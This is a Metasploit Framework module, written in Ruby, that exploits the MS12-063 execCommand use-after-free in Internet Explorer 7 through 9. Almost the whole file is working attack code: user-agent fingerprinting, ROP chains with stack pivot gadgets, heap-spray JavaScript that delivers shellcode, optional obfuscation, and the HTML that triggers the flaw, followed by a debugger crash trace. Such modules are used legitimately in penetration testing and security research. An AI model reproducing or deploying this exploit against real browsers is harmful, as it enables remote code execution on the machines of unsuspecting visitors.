##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "9.0",
		:javascript => true,
		:rank       => GoodRanking
	})

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability ",
			'Description'    => %q{
				This module exploits a vulnerability found in Microsoft Internet Explorer (MSIE). When
				rendering an HTML page, the CMshtmlEd object gets deleted in an unexpected manner,
				but the same memory is reused again later in the CMshtmlEd::Exec() function, leading
				to a use-after-free condition.

				Please note that this vulnerability has been exploited in the wild since Sep 14 2012.

				Also note that presently, this module has some target dependencies for the ROP chain to be
				valid. For WinXP SP3 with IE8, msvcrt must be present (as it is by default).
				For Vista or Win7 with IE8, or Win7 with IE9, JRE 1.6.x or below must be installed (which
				is often the case).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',     # via ZDI
					'eromang',     # First public discovery
					'binjo',
					'sinn3r',      # Metasploit
					'juan vazquez' # Metasploit
				],
			'References'     =>
				[
					[ 'CVE', '2012-4969' ],
					[ 'OSVDB', '85532' ],
					[ 'MSB', 'MS12-063' ],
					[ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2757760' ],
					[ 'URL', 'http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/' ],
					[ 'URL', 'http://blog.vulnhunt.com/index.php/2012/09/17/ie-execcommand-fuction-use-after-free-vulnerability-0day/'],
					[ 'URL', 'http://metasploit.com' ]
				],
			'Payload'        =>
				{
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "none",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5fa', 'Random' => false } ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Random' => false } ],
					[ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5fa', 'Random' => false } ],
					[ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4', 'Random' => false } ],
					[ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4', 'Random' => false } ],
					[ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fc', 'Random' => true } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Sep 14 2012",  # When it was spotted in the wild by eromang
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		when '6.0'
			os_name = 'Windows Vista'
		when '6.1'
			os_name = 'Windows 7'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				vprint_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		return code if t['Rop'].nil?

		# Both ROP chains generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			exec_size = code.length
			stack_pivot = [
				0x77c4e393, # RETN
				0x77c4e392, # POP EAX # RETN
				0x77c15ed5, # XCHG EAX, ESP # RETN
			].pack("V*")
			rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=>stack_pivot, 'target'=>'xp'})

		else
			print_status("Using JRE ROP")
			exec_size = 0xffffffff - code.length + 1
			if t['Random']
				stack_pivot = [
					0x0c0c0c0c, # 0c0c0c08
					0x7c347f98, # RETN
					0x7c347f97, # POP EDX # RETN
					0x7c348b05  # XCHG EAX, ESP # RET
				].pack("V*")
			else
				stack_pivot = [
					0x7c347f98, # RETN
					0x7c347f97, # POP EDX # RETN
					0x7c348b05  # XCHG EAX, ESP # RET
				].pack("V*")
			end
			rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})
		end

		return rop_payload
	end

	# Spray published by corelanc0d3r
	# Exploit writing tutorial part 11 : Heap Spraying Demystified
	# See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
	def get_random_spray(t, js_code, js_nops)

		spray = <<-JS

		function randomblock(blocksize)
		{
			var theblock = "";
			for (var i = 0; i < blocksize; i++)
			{
				theblock += Math.floor(Math.random()*90)+10;
			}
			return theblock;
		}

		function tounescape(block)
		{
			var blocklen = block.length;
			var unescapestr = "";
			for (var i = 0; i < blocklen-1; i=i+4)
			{
				unescapestr += "%u" + block.substring(i,i+4);
			}
			return unescapestr;
		}

		var heap_obj = new heapLib.ie(0x10000);

		var code = unescape("#{js_code}");
		var nops = unescape("#{js_nops}");

		while (nops.length < 0x80000) nops += nops;

		var offset_length = #{t['Offset']};

		for (var i=0; i < 0x1000; i++) {
			var padding = unescape(tounescape(randomblock(0x1000)));
			while (padding.length < 0x1000) padding+= padding;
			var junk_offset = padding.substring(0, offset_length);
			var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
			while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
			sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
			heap_obj.alloc(sprayblock);
		}

		JS

		return spray
	end

	def get_spray(t, js_code, js_nops)
		js = <<-JS
		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("#{js_code}");
		var nops = unescape("#{js_nops}");

		while (nops.length < 0x80000) nops += nops;
		var offset = nops.substring(0, #{t['Offset']});
		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();

		for (var i=1; i < 0x300; i++) {
			heap_obj.alloc(block);
		}

		var overflow = nops.substring(0, 10);
		JS
	end


	def load_html1(cli, my_target)
		p = get_payload(my_target, cli)

		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
		js_r_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

		if my_target['Random']
			js = get_random_spray(my_target, js_code, js_r_nops)
		else
			js = get_spray(my_target, js_code, js_nops)
		end

		js = heaplib(js, {:noobfu => true})
		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		html = %Q|
		<html>
			<body>
				<script>
					var arrr = new Array();
					arrr[0] = window.document.createElement("img");
					arrr[0]["src"] = "#{Rex::Text.rand_text_alpha(1)}";
				</script>

				<iframe src="#{this_resource}/#{@html2_name}"></iframe>
				<script>
					#{js}
				</script>
			</body>
		</html>
		|

		return html
	end

	def load_html2
		html = %Q|
		<HTML>
			<script>
				function funcB() {
					document.execCommand("selectAll");
				};

				function funcA() {
					document.write("#{Rex::Text.rand_text_alpha(1)}");
					parent.arrr[0].src = "YMjf\\u0c08\\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH";
				}

			</script>
			<body onload='funcB();' onselect='funcA()'>
				<div contenteditable='true'>
					a
				</div>
			</body>
		</HTML>
		|

		return html
	end

	def this_resource
		r = get_resource
		return ( r == '/') ? '' : r
	end

	def on_request_uri(cli, request)
		uri       = request.uri
		agent     = request.headers['User-Agent']
		my_target = get_target(agent)

		vprint_status("Requesting: #{uri}")
		print_status(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("Browser not supported, sending a 404: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		if uri =~ /#{@html2_name}/
			print_status("Loading #{@html2_name}")
			html = load_html2
		elsif uri =~ /#{@html1_name}/
			print_status("Loading #{@html1_name}")
			html = load_html1(cli, my_target)
		elsif uri =~ /\/$/ or (!this_resource.empty? and uri =~ /#{this_resource}$/)
			print_status("Redirecting to #{@html1_name}")
			send_redirect(cli, "#{this_resource}/#{@html1_name}")
			return
		else
			send_not_found(cli)
			return
		end

		html = html.gsub(/^\t\t/, '')

		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

	def exploit
		@html1_name = "#{Rex::Text.rand_text_alpha(5)}.html"
		@html2_name = "#{Rex::Text.rand_text_alpha(6)}.html"
		super
	end

end


=begin
0:008> r
eax=00000000 ebx=0000001f ecx=002376c8 edx=0000000d esi=00000000 edi=0c0c0c08
eip=637d464e esp=020bbe80 ebp=020bbe8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
mshtml!CMshtmlEd::Exec+0x134:
637d464e 8b07            mov     eax,dword ptr [edi]  ds:0023:0c0c0c08=????????

0:008> u
mshtml!CMshtmlEd::Exec+0x134:
637d464e 8b07            mov     eax,dword ptr [edi]
637d4650 57              push    edi
637d4651 ff5008          call    dword ptr [eax+8]

0:008> k
ChildEBP RetAddr
020bbe8c 637d4387 mshtml!CMshtmlEd::Exec+0x134
020bbebc 637be2fc mshtml!CEditRouter::ExecEditCommand+0xd6
020bc278 638afda7 mshtml!CDoc::ExecHelper+0x3c91
020bc298 638ee2a9 mshtml!CDocument::Exec+0x24
020bc2c0 638b167b mshtml!CBase::execCommand+0x50
020bc2f8 638e7445 mshtml!CDocument::execCommand+0x93
020bc370 636430c9 mshtml!Method_VARIANTBOOLp_BSTR_oDoVARIANTBOOL_o0oVARIANT+0x149
020bc3e4 63643595 mshtml!CBase::ContextInvokeEx+0x5d1
020bc410 63643832 mshtml!CBase::InvokeEx+0x25
020bc460 635e1cdc mshtml!DispatchInvokeCollection+0x14b
020bc4a8 63642f30 mshtml!CDocument::InvokeEx+0xf1
020bc4d0 63642eec mshtml!CBase::VersionedInvokeEx+0x20
020bc520 633a6d37 mshtml!PlainInvokeEx+0xea
020bc560 633a6c75 jscript!IDispatchExInvokeEx2+0xf8
020bc59c 633a9cfe jscript!IDispatchExInvokeEx+0x6a
020bc65c 633a9f3c jscript!InvokeDispatchEx+0x98
020bc690 633a77ff jscript!VAR::InvokeByName+0x135
020bc6dc 633a85c7 jscript!VAR::InvokeDispName+0x7a
020bc708 633a9c0b jscript!VAR::InvokeByDispID+0xce
020bc8a4 633a5ab0 jscript!CScriptRuntime::Run+0x2989
=end
